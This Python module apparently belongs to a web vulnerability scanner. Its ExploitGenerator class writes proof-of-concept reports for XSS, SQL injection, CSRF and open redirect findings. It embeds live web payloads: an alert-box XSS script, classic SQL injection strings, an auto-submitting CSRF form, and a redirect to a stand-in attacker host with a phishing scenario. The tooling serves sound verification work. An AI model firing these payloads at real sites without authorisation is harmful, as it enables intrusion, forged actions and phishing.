"""
Exploit generator module for creating proof-of-concept exploits for vulnerabilities.
"""

import logging
import urllib.parse
import html

# Configure logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

class ExploitGenerator:
    """Generates proof-of-concept exploits for verified vulnerabilities."""
    
    def __init__(self):
        pass
    
    def generate_poc(self, vulnerability):
        """Generate a proof-of-concept exploit for a vulnerability.
        
        Args:
            vulnerability (dict): The validated vulnerability details.
            
        Returns:
            str: A proof-of-concept exploit or instructions.
        """
        vuln_type = vulnerability['vulnerability_type']
        
        try:
            if vuln_type == 'XSS':
                return self._generate_xss_poc(vulnerability)
            elif vuln_type == 'SQLi':
                return self._generate_sqli_poc(vulnerability)
            elif vuln_type == 'CSRF':
                return self._generate_csrf_poc(vulnerability)
            elif vuln_type == 'Open Redirect':
                return self._generate_open_redirect_poc(vulnerability)
            else:
                return f"No proof-of-concept generator available for {vuln_type}"
        
        except Exception as e:
            logger.error(f"Error generating proof-of-concept: {str(e)}")
            return f"Error generating proof-of-concept: {str(e)}"
    
    def _generate_xss_poc(self, vulnerability):
        """Generate a proof-of-concept for XSS vulnerabilities."""
        evidence = vulnerability['evidence']
        affected_url = vulnerability['affected_url']
        parameter = evidence.get('parameter', '')
        form_method = evidence.get('form_method', 'get').lower()
        form_action = evidence.get('form_action', affected_url)
        
        # Safe payload that shows an alert with the domain, confirming XSS
        safe_payload = '<script>alert("XSS vulnerability confirmed on "+document.domain)</script>'
        encoded_payload = urllib.parse.quote(safe_payload)
        
        if form_method == 'get':
            # For GET requests, create a URL with the payload
            if '?' in affected_url:
                poc_url = f"{affected_url}&{parameter}={encoded_payload}"
            else:
                poc_url = f"{affected_url}?{parameter}={encoded_payload}"
            
            poc = f"""
# XSS Proof of Concept

1. Navigate to the following URL:
   {poc_url}

2. You should see an alert box displaying "XSS vulnerability confirmed on [domain]"

## Alternative HTML form (if URL is too long)
```html
<form action="{affected_url}" method="get">
    <input type="hidden" name="{parameter}" value="{html.escape(safe_payload)}">
    <input type="submit" value="Trigger XSS">
</form>
```
"""
            return poc
        
        else:  # form_method == 'post'
            # For POST requests, create a form
            poc = f"""
# XSS Proof of Concept

1. Create an HTML file with the following content:
```html
<form action="{form_action}" method="post">
    <input type="hidden" name="{parameter}" value="{html.escape(safe_payload)}">
    <input type="submit" value="Trigger XSS">
</form>
```

2. Open the HTML file in a browser and click "Trigger XSS"
3. You should see an alert box displaying "XSS vulnerability confirmed on [domain]"
"""
            return poc

    def _generate_sqli_poc(self, vulnerability):
        """Generate a proof-of-concept for SQL Injection vulnerabilities."""
        evidence = vulnerability['evidence']
        affected_url = vulnerability['affected_url']
        parameter = evidence.get('parameter', '')
        query_type = evidence.get('query_type', 'boolean')
        
        if query_type == 'boolean':
            # Boolean-based SQLi proof-of-concept
            true_condition = "1=1"
            false_condition = "1=2"
            
            true_url = affected_url.replace(parameter + "=", parameter + "=" + urllib.parse.quote(true_condition))
            false_url = affected_url.replace(parameter + "=", parameter + "=" + urllib.parse.quote(false_condition))
            
            poc = f"""
# SQL Injection Proof of Concept (Boolean-based)

1. Navigate to the following URL (TRUE condition):
   {true_url}
   
2. Note the response (page content, HTTP status, etc.)

3. Then navigate to this URL (FALSE condition):
   {false_url}
   
4. Compare the responses. If they differ, it confirms the SQL injection vulnerability.

## Explanation
The first URL injects a condition that is always TRUE (1=1), which will likely return normal results.
The second URL injects a condition that is always FALSE (1=2), which may return different results,
errors, or no data, confirming that the application is directly inserting the parameter into a SQL query.
"""
        elif query_type == 'error':
            # Error-based SQLi proof-of-concept
            error_payload = "'"  # Simple quote to cause syntax errors
            
            error_url = affected_url.replace(parameter + "=", parameter + "=" + urllib.parse.quote(error_payload))
            
            poc = f"""
# SQL Injection Proof of Concept (Error-based)

1. Navigate to the following URL:
   {error_url}
   
2. Look for database error messages in the response.

## Explanation
The single quote (') will likely cause a syntax error in the SQL query if the parameter
is not properly sanitized. Any visible database error messages confirm the vulnerability.
"""
        else:
            # Generic SQLi proof-of-concept
            poc = f"""
# SQL Injection Proof of Concept

The parameter '{parameter}' in the URL {affected_url} is vulnerable to SQL injection.

Try the following test values:
1. ' OR '1'='1
2. ' OR 1=1--
3. 1' ORDER BY 1--

Depending on the database type and query structure, these might need slight modifications.
"""
        
        return poc
        
    def _generate_csrf_poc(self, vulnerability):
        """Generate a proof-of-concept for CSRF vulnerabilities."""
        evidence = vulnerability['evidence']
        affected_url = vulnerability['affected_url']
        method = evidence.get('method', 'POST').upper()
        parameters = evidence.get('parameters', {})
        
        # Create an HTML form with the extracted parameters
        form_fields = ''
        for name, value in parameters.items():
            form_fields += f'    <input type="hidden" name="{name}" value="{html.escape(str(value))}">\n'
        
        poc = f"""
# Cross-Site Request Forgery (CSRF) Proof of Concept

1. Create an HTML file with the following content:
```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
</head>
<body onload="document.forms[0].submit()">
    <h1>CSRF Proof of Concept</h1>
    <p>This form will be automatically submitted when the page loads.</p>
    <form action="{affected_url}" method="{method}">
{form_fields}    </form>
</body>
</html>
```

2. When a logged-in user visits this page, the form will automatically submit with their credentials.

## Exploitation Scenario
1. Attacker hosts this HTML on a malicious website
2. Attacker tricks victim into visiting the website while logged in to the vulnerable application
3. The form automatically submits, performing the action without the victim's consent
"""
        
        return poc
        
    def _generate_open_redirect_poc(self, vulnerability):
        """Generate a proof-of-concept for Open Redirect vulnerabilities."""
        evidence = vulnerability['evidence']
        affected_url = vulnerability['affected_url']
        parameter = evidence.get('parameter', '')
        
        # Create a malicious redirect to a hypothetical attacker site
        malicious_site = "https://attacker-site.example.com"
        encoded_redirect = urllib.parse.quote(malicious_site)
        
        if '?' in affected_url:
            poc_url = f"{affected_url}&{parameter}={encoded_redirect}"
        else:
            poc_url = f"{affected_url}?{parameter}={encoded_redirect}"
            
        poc = f"""
# Open Redirect Proof of Concept

1. Navigate to the following URL:
   {poc_url}
   
2. You should be redirected to {malicious_site}

## Exploitation Scenario
This vulnerability could be exploited in phishing attacks:
1. Attacker sends victim a link that appears legitimate (e.g., https://legitimate-site.com/redirect?url=...)
2. The victim sees the trusted domain and clicks the link
3. The victim is redirected to a malicious site that may look identical to the legitimate site
"""
        
        return poc
